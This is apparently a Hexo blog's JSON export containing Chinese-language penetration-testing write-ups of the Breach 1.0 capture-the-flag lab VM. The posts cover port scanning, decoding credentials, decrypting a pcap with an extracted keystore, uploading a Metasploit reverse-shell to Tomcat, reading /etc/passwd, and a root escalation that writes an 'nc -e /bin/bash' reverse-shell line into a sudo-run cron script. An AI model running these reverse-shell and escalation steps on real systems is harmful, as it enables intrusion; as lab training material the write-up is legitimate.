{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"breach1靶场渗透（二）","slug":"breach1靶场渗透（二）","date":"2021-09-17T05:05:38.000Z","updated":"2021-09-17T07:31:21.222Z","comments":true,"path":"2021/09/17/breach1靶场渗透（二）/","link":"","permalink":"http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"紧接上一回，看看过滤后的记录，找到一条链接： 打开网页看看，并不能正确响应，看到地址栏提示不安全？ https为何提示不安全？证书过期了么？ 换个火狐浏览器打开试试看，提示是不安全的连接。可能是浏览器认为证书过期。尝试使用burp做个转发（就是加个burp代理，拦截再放过请求包。）因为burp的证书是受信任的： OK，新的页面，新的希望。一个HTTP basic 验证。回到鲨鱼，往下再看看记录。在第三条找到了basic关键字： 尝试解码看看： 获取到一组用户密码： 1tomcat:Tt\\5D8F(#!*u=G)4m7zB 登录看看，一个tomcat的后台： 看到文件上传的位置： 使用msf生成一个反弹shell的马： 同时开启监听： 将生成好的文件上传并且访问： 回到msf看到shell: 尝试获取交互shell： 1python -c &#x27;import pty;pty. spawn(&quot;/bin/bash&quot;)&#x27; 看看内核版本： 1uname -a 看到版本是Linux Breach 4.2.0-27-generic msf里看看有没有可以利用的漏洞。结果并没有 那就看看有没有什么敏感文件： 1ls -a 1cat /etc/passwd 1find / -name 读取到/etc/passwd文件： 逐级查看目录，在www目录下看到两个文件，打开5446文件，莫名的php文件 打开查看，是数据库的账号密码文件，账号是root,密码是空。 连接数据库： 在user表内找打了账号，密码信息： 对milton的密码解密（哈希值）： 切换用户： 再重复之前的操作，查看文件，看看历史执行，看看能不能root执行什么，结果并没有。在历史命令里我们看到切换到了blubergh账号，但是我们并没有找到他的密码？ 只能回过头去看，慢慢寻找。想起之前目录扫描时的图片目录，把所有的图片下载下来，strings 或者exiftool看看照片有没有注释。 [](https://imgtu.com/i/4KDmCR 尝试切换，确实是密码，看看权限： 两个文件能以root身份执行，其中tidyup是用来隔一段时间删除tomcat上传的文件用来防止黑客 另一个文件tee: 如此，我们可以利用第一个命令向第二个文件内写入一个定时任务，第二个文件每三分钟执行一次: 123echo &quot;nc -e /bin/bash 192.168.110.129 5555&quot; &gt; shell.txtcat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh 随后我们在msf机器开启监听： 1nc -lvvp 5555 等待一段时间： 结束。","categories":[],"tags":[{"name":"breach 渗透测试","slug":"breach-渗透测试","permalink":"http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"breach1靶场渗透","slug":"breach1靶场渗透","date":"2021-09-16T16:25:49.000Z","updated":"2021-09-16T16:32:09.171Z","comments":true,"path":"2021/09/17/breach1靶场渗透/","link":"","permalink":"http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/","excerpt":"","text":"靶场搭建 下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默认将ip设置为192.168.110.140。 测试： 因为IP已知，首先对靶场进行端口扫描，借助nmap: 1nmap -p 1-65535 192.168.110.140 扫描后看到结果，所有的端口都是打开状态，因此判断可能是采用了ips，或者waf防护 尝试在浏览器中访问靶机IP，看到一些没啥用的信息（讲故事） 尝试看看源码？也就这样了。看到一段加密过的值 1&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----&gt; 这段值是64位，根据常见的加密算法的特征，猜测是base64加密。 （md5:32位，sha1：40位）尝试用自动解码工具解码看看，果然是base64，但还是看不懂，难道加了盐？再试一次，能看懂了。 解码出现： 1pgibbons:damnitfeel$goodtobeagang$ta 猜测是某个用户账号密码 回到原来的初始页面，点击图片，进入一个类似导航的页面： 依次点点看 ，再最后一个链接，进入了一个后台直接看到是什么cms ，后面可以查询看看这个impress cms 有没有什么漏洞 用之前的密码试试看？果然进入： 先看看cms是不是有什么漏洞。msf打开： 1searchsploit impresscms 有是有就是不知道这里具体的版本： 依次尝试，并不行。。。 继续看看页面上有啥，这里有三个未读邮件，进去看看 第三封邮件有信息，在 192.168.110.140/.keystore 位置保存了文件 keystore是keytool（jdk里自带）生成的密钥、证书存储的地方，这里有什么关键的信息？可以用keytool提取java里的密钥、证书。不管别的，先下载这个keystore。但是没有密钥口令也没法解开。 继续寻找密钥，点点点，在View Account内有个一content链接打开看看？ 看看提示，有个文件： http://192.168.110.140/impresscms/_SSL_test_phase1.pcap。pcap文件？什么玩意？搜搜看，原来是wireshark的流量包，下了再说。继续看，生成keystore需要的别名，密钥都是“tomcat”。在下载keystore的目录下，使用keytool生成证书： 1keytool -importkeystore -srckeystore E:\\Download\\keystore -destkeystore E:\\Download\\\\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat 密钥库口令就是tomcat。可以看到tomcat.p12证书生成。 打开SSL_test_phase1.pcap文件，https协议，用了TSL加密，因此导入刚刚生成的证书来解密。 编辑–&gt;首选项–&gt;Protocols–&gt;TLS–&gt;edit 回到wireshark主页面，过滤一下信息： 1ip.src == 192.168.110.140 || ip.dst == 192.168.110.140 and http","categories":[],"tags":[{"name":"breach1.0 渗透测试","slug":"breach1-0-渗透测试","permalink":"http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"myfirstblog","slug":"myfirstblog","date":"2021-09-15T12:00:35.000Z","updated":"2021-09-16T16:21:24.360Z","comments":true,"path":"2021/09/15/myfirstblog/","link":"","permalink":"http://example.com/2021/09/15/myfirstblog/","excerpt":"","text":"我的博客，分享渗透测试学习的点点滴滴","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"breach 渗透测试","slug":"breach-渗透测试","permalink":"http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"breach1.0 渗透测试","slug":"breach1-0-渗透测试","permalink":"http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]}